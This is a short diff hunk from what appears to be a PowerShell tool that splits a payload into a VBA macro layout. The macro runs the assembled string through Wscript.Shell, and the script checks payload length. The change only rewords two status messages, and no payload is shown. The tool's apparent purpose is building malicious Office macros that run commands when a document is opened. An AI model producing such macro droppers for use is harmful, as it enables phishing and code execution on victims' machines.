@@ -24,9 +24,9 @@ Sub MyMacro()
     CreateObject("Wscript.Shell").Run Str
 End Sub
 "@
-    Write-Host -ForegroundColor Cyan "[*] Showing Macro Layout"
+    Write-Host -ForegroundColor Cyan "[*] Showing layout where macro name is `"MyMacro`""
     Write-Output $Macro_layout
-    Write-Host -ForegroundColor Green "[+] Macro Layout Generated"
+    Write-Host -ForegroundColor Green "[+] Macro layout generated"
 }
 elseif($Payload.Length -gt 8192){
     Write-Host -ForegroundColor Yellow "[!] Payload provided is over the allowed length of 8192 character"
